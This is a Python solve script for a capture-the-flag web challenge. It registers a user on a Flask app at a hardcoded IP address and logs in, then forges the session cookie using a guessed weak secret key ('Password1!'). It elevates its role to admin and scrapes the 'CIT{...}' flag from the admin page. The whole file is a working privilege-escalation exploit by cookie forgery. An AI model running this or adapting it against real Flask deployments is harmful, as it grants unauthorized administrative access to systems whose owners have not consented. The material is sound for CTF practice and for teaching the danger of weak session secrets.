#!/usr/bin/env -S uv run
# /// script
# dependencies = [
#   "Flask==3.1.0",
#   "requests>=2.32.0",
# ]
# ///

import re
import sys
import time

import requests
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

SECRET_KEY = "Password1!"
REGISTER_PASSWORD = "Aa1!aaaa"


def fail(message: str) -> "NoReturn":
    raise SystemExit(message)


def make_serializer() -> SecureCookieSessionInterface:
    app = Flask(__name__)
    app.secret_key = SECRET_KEY
    return SecureCookieSessionInterface().get_signing_serializer(app)


def main() -> None:
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://23.179.17.92:5557"
    base_url = base_url.rstrip("/")

    session = requests.Session()
    session.trust_env = False

    username = f"solve{time.time_ns()}"
    full_name = "Solver User"
    email = f"{username}@example.com"

    register = session.post(
        f"{base_url}/register",
        data={
            "full_name": full_name,
            "username": username,
            "email": email,
            "password": REGISTER_PASSWORD,
        },
        timeout=10,
    )
    if register.status_code != 200 or "Account created" not in register.text:
        fail("could not register a fresh user")

    login = session.post(
        f"{base_url}/login",
        data={"username": username, "password": REGISTER_PASSWORD},
        allow_redirects=False,
        timeout=10,
    )
    if login.status_code != 302 or login.headers.get("Location") != "/workspace":
        fail("could not log in with the fresh user")

    cookie = session.cookies.get("session")
    if not cookie:
        fail("missing session cookie after login")

    serializer = make_serializer()
    payload = serializer.loads(cookie)
    payload["role"] = "admin"
    forged_cookie = serializer.dumps(payload)

    admin = session.get(
        f"{base_url}/admin",
        headers={"Cookie": f"session={forged_cookie}"},
        timeout=10,
    )
    if admin.status_code != 200:
        fail(f"unexpected admin status: {admin.status_code}")

    match = re.search(r"CIT\{[^<\s]+\}", admin.text)
    if not match:
        fail("flag not found in admin response")

    print(match.group(0))


if __name__ == "__main__":
    main()
